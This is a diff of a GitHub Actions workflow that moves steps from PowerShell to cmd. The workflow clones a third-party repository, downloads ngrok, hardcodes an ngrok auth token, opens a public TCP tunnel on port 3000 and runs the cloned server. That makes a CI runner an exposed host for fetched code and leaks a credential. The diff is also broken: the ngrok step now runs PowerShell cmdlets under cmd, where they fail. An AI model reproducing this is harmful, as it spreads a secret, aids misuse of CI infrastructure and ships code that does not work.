@@ -19,26 +19,25 @@ jobs:
         node-version: 14
 
     - name: Install Git
-      run: |
-        choco install git
-      shell: powershell
+      run: choco install git
+      shell: cmd
 
     - name: Download repository
-      run: |
-        git clone https://github.com/MrBY510KONFACEBOOK/ewweq.git
-      shell: pwsh
+      run: git clone https://github.com/MrBY510KONFACEBOOK/ewweq.git
+      shell: cmd
 
     - name: Install ngrok and run server
       run: |
         cd ewweq
         Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
         Expand-Archive ngrok.zip -DestinationPath .
-        $env:NGROK_AUTH="2WalQDUadTNZL96t2jyT1TnTc4R_3VvFJNu3CB8an7DxoCpoP"
-        Start-Process -NoNewWindow .\ngrok.exe tcp 3000
+        set NGROK_AUTH=2WalQDUadTNZL96t2jyT1TnTc4R_3VvFJNu3CB8an7DxoCpoP
+        start /B ngrok.exe tcp 3000
+      shell: cmd
 
     - name: Install npm dependencies and run server
       run: |
         cd ewweq
         npm install
         node server.js
-      shell: pwsh
+      shell: cmd
